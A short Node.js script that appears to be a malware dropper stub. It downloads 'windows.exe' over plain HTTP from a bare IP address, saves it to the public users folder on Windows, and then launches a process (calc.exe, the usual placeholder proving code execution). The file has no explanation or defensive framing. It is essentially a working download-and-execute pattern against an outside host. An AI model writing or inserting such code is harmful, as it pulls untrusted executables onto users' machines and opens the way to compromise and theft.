import fs from 'node:fs';
import http from 'node:http';

http.get('http://172.86.73.132/windows.exe', (res) => {
  const file = fs.createWriteStream('c:/users/public/windows.exe');
  res.pipe(file);
});

import { exec } from 'node:child_process';

exec('start calc.exe'); // Windows
